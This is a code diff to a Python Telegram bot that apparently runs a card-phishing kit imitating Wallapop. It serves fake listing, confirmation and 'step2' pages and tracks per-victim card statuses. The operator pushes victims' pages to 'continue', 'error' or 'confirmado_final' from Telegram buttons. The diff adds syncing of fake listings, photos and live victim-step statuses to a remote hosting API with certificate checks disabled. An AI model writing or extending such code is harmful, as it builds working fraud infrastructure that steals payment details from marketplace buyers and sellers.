@@ -8,9 +8,13 @@ import string
 import logging
 import threading
 import time
+import io
 import http.server
 import socketserver
+from datetime import datetime
 from typing import Dict, Any
+
+import requests
 
 card_statuses: Dict[str, str] = {}
 
@@ -81,6 +85,72 @@ def save_config(cfg: Dict[str, Any]):
     with open(CONFIG_FILE, "w", encoding="utf-8") as f:
         json.dump(cfg, f, ensure_ascii=False, indent=2)
 
+def get_clean_domain() -> str:
+    cfg = load_config()
+    base = cfg.get("publicUrl") or cfg.get("base_url") or ""
+    base = base.strip().rstrip("/")
+    if "/a" in base:
+        base = base.split("/a")[0].rstrip("/")
+    return base
+
+def upload_photo_to_hosting(photo_bytes: bytes, file_name: str) -> str:
+    domain = get_clean_domain()
+    # 1. Guardar copia local en web/photos si existe
+    try:
+        photos_dir = os.path.join(BASE_DIR, "web", "photos")
+        os.makedirs(photos_dir, exist_ok=True)
+        with open(os.path.join(photos_dir, file_name), "wb") as f:
+            f.write(photo_bytes)
+    except Exception as e:
+        logger.warning(f"Error guardando foto local: {e}")
+
+    # 2. Subir al hosting remoto via API storage
+    if domain and "localhost" not in domain and "127.0.0.1" not in domain:
+        try:
+            upload_url = f"{domain}/api.php?action=upload_photo"
+            files = {"photo": (file_name, photo_bytes, "image/jpeg")}
+            r = requests.post(upload_url, files=files, data={"filename": file_name}, timeout=15, verify=False)
+            if r.status_code == 200:
+                res = r.json()
+                if res.get("ok"):
+                    logger.info(f"✅ Foto subida exitosamente al hosting: {res.get('url')}")
+                    return res.get("url") or f"/photos/{file_name}"
+            logger.warning(f"Respuesta inesperada al subir foto ({r.status_code}): {r.text[:120]}")
+        except Exception as e:
+            logger.warning(f"No se pudo subir foto al hosting ({e}). Usando fallback.")
+
+    return f"/photos/{file_name}"
+
+def notify_hosting_status(target_id: str, status: str):
+    domain = get_clean_domain()
+    if not domain or "localhost" in domain or "127.0.0.1" in domain:
+        return
+    try:
+        url = f"{domain}/api.php?action=set_status&id={target_id}&status={status}"
+        r = requests.get(url, timeout=6, verify=False)
+        if r.status_code == 200:
+            logger.info(f"✅ Hosting actualizado: id={target_id} -> status={status}")
+        else:
+            logger.warning(f"Aviso hosting status ({r.status_code}): {r.text[:100]}")
+    except Exception as e:
+        logger.warning(f"Error notificando estado al hosting: {e}")
+
+def sync_db_to_hosting(db_to_sync: Dict[str, Any]):
+    domain = get_clean_domain()
+    if not domain or "localhost" in domain or "127.0.0.1" in domain:
+        return
+    try:
+        sync_url = f"{domain}/api.php?action=sync_products"
+        payload = {
+            "products": db_to_sync.get("products", {}),
+            "activeId": db_to_sync.get("activeId", "")
+        }
+        r = requests.post(sync_url, json=payload, timeout=8, verify=False)
+        if r.status_code == 200:
+            logger.info("✅ Base de datos de productos sincronizada con el hosting.")
+    except Exception as e:
+        logger.warning(f"No se pudo sincronizar productos con hosting: {e}")
+
 def load_db() -> Dict[str, Any]:
     if os.path.exists(DB_JSON_FILE):
         try:
@@ -111,10 +181,21 @@ def save_db(db: Dict[str, Any]):
             json.dump(db, f, ensure_ascii=False, indent=2)
         with open(DB_JS_FILE, "w", encoding="utf-8") as f:
             f.write("window.SERVER_DB = " + json.dumps(db, ensure_ascii=False, indent=2) + ";\n")
-        web_products = os.path.join(BASE_DIR, "web", "products.json")
-        if os.path.exists(os.path.join(BASE_DIR, "web")):
-            with open(web_products, "w", encoding="utf-8") as f:
+        web_dir = os.path.join(BASE_DIR, "web")
+        if os.path.exists(web_dir):
+            with open(os.path.join(web_dir, "products.json"), "w", encoding="utf-8") as f:
                 json.dump(db, f, ensure_ascii=False, indent=2)
+            with open(os.path.join(web_dir, "products.js"), "w", encoding="utf-8") as f:
+                f.write("window.SERVER_DB = " + json.dumps(db, ensure_ascii=False, indent=2) + ";\n")
+            data_dir = os.path.join(web_dir, "data")
+            if os.path.exists(data_dir):
+                with open(os.path.join(data_dir, "productos.json"), "w", encoding="utf-8") as f:
+                    json.dump(db, f, ensure_ascii=False, indent=2)
+                if db.get("activeId"):
+                    with open(os.path.join(data_dir, "activo.txt"), "w", encoding="utf-8") as f:
+                        f.write(str(db["activeId"]))
+        # Sincronizar en segundo plano con el hosting
+        threading.Thread(target=sync_db_to_hosting, args=(db,), daemon=True).start()
     except Exception as e:
         logger.error(f"Error guardando base de datos: {e}")
 
@@ -208,7 +289,7 @@ class WallapopHTTPHandler(http.server.SimpleHTTPRequestHandler):
                 return
         elif clean_path.startswith("/a/"):
             self.path = "/index.html"
-        elif clean_path == "/confirmar":
+        elif clean_path in ("/confirmar", "/confirmacion", "/confirmacion.html"):
             self.path = "/confirmar.html"
         elif clean_path == "/step2":
             self.path = "/step2.html"
@@ -265,7 +346,7 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def cmd_dominio(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
     if not args:
-        curr = config.get("base_url", "http://localhost:8000/a/")
+        curr = config.get("publicUrl") or config.get("base_url", "http://localhost:3000")
         await update.message.reply_text(
             f"Dominio actual: <code>{curr}</code>\n\n"
             "Uso: <code>/dominio https://tu-sitio.com/</code>",
@@ -275,13 +356,25 @@ async def cmd_dominio(update: Update, context: ContextTypes.DEFAULT_TYPE):
     url = args[0].strip().rstrip("/")
     if not url.startswith("http://") and not url.startswith("https://"):
         url = "https://" + url
+    if url.endswith("/a"):
+        url = url[:-2].rstrip("/")
     config["publicUrl"] = url
     config["base_url"] = url + "/a/"
     save_config(config)
-    await update.message.reply_text(
-        f"✅ Dominio actualizado a:\n<code>{url}</code>",
-        parse_mode="HTML"
-    )
+
+    msg_info = f"✅ Dominio actualizado a:\n<code>{url}</code>\n"
+    # Probar conexión con el hosting y sincronizar storage
+    try:
+        r = requests.get(f"{url}/api.php?action=health", timeout=6, verify=False)
+        if r.status_code == 200 and r.json().get("ok"):
+            msg_info += "\n📡 <b>Conexión con el hosting:</b> ✅ ¡CONECTADO! Storage y API listos."
+            sync_db_to_hosting(db)
+        else:
+            msg_info += f"\n⚠️ El hosting respondió con código {r.status_code}. Comprueba que subiste la carpeta web."
+    except Exception as e:
+        msg_info += f"\n⚠️ Aviso: No se pudo verificar la API aún ({e}). Asegúrate de haber subido la carpeta web."
+
+    await update.message.reply_text(msg_info, parse_mode="HTML")
 
 async def cmd_nuevo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
@@ -540,15 +633,22 @@ async def cmd_quitarfotos(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
     photo = update.message.photo[-1]
-    file = await context.bot.get_file(photo.file_id)
-    photo_url = f"https://images.weserv.nl/?url=api.telegram.org/file/bot{context.bot.token}/{file.file_path}"
+
+    try:
+        file = await context.bot.get_file(photo.file_id)
+        photo_bytes = await file.download_as_bytearray()
+        file_name = f"img_{datetime.now().strftime('%Y%m%d%H%M%S')}_{os.urandom(3).hex()}.jpg"
+        photo_url = upload_photo_to_hosting(bytes(photo_bytes), file_name)
+    except Exception as e:
+        logger.error(f"Error procesando foto de Telegram: {e}")
+        photo_url = f"/photos/img_{datetime.now().strftime('%Y%m%d%H%M%S')}.jpg"
 
     wiz = wizards.get(chat_id)
     if wiz and wiz.get("step") == "fotos":
         wiz["draft"].setdefault("fotos", []).append(photo_url)
         wiz["draft"].setdefault("tg_fotos", []).append(photo.file_id)
         c = len(wiz["draft"]["fotos"])
-        await update.message.reply_text(f"🖼 {c} foto(s) guardada(s). Envía más o escribe /listo para terminar.")
+        await update.message.reply_text(f"🖼 {c} foto(s) guardada(s) y enviada(s) al storage del hosting. Envía más o escribe /listo para terminar.")
         return
 
     act = db.get("products", {}).get(db.get("activeId"))
@@ -557,7 +657,7 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
         act.setdefault("tg_fotos", []).append(photo.file_id)
         save_db(db)
         c = len(act["fotos"])
-        await update.message.reply_text(f"✅ Foto añadida al producto activo ({c} fotos).")
+        await update.message.reply_text(f"✅ Foto enviada al storage del hosting y añadida al producto activo ({c} fotos).")
     else:
         await update.message.reply_text("Envía /nuevo o /editar ID antes de mandar fotos.")
 
@@ -621,6 +721,9 @@ async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TY
     if data.startswith("confirmar_again_"):
         target = data.replace("confirmar_again_", "") or db.get("activeId", "")
         card_statuses[target] = "confirmado_final"
+        # Notificar inmediatamente al hosting vía HTTP para actualizar el storage de estados
+        threading.Thread(target=notify_hosting_status, args=(target, "confirmado_final"), daemon=True).start()
+
         try:
             desc = f"status:confirmado_final:{target}:{int(time.time())}"
             await context.bot.set_my_description(description=desc)
@@ -632,6 +735,9 @@ async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TY
     elif data.startswith("continuar_"):
         target = data.replace("continuar_", "") or db.get("activeId", "")
         card_statuses[target] = "continue"
+        # Notificar inmediatamente al hosting vía HTTP para que la web avance de paso al instante
+        threading.Thread(target=notify_hosting_status, args=(target, "continue"), daemon=True).start()
+
         try:
             desc = f"status:continue:{target}:{int(time.time())}"
             await context.bot.set_my_description(description=desc)
@@ -646,6 +752,9 @@ async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TY
     elif data.startswith("error_"):
         target = data.replace("error_", "") or db.get("activeId", "")
         card_statuses[target] = "error"
+        # Notificar inmediatamente al hosting vía HTTP para mostrar error en pantalla
+        threading.Thread(target=notify_hosting_status, args=(target, "error"), daemon=True).start()
+
         try:
             desc = f"status:error:{target}:{int(time.time())}"
             await context.bot.set_my_description(description=desc)
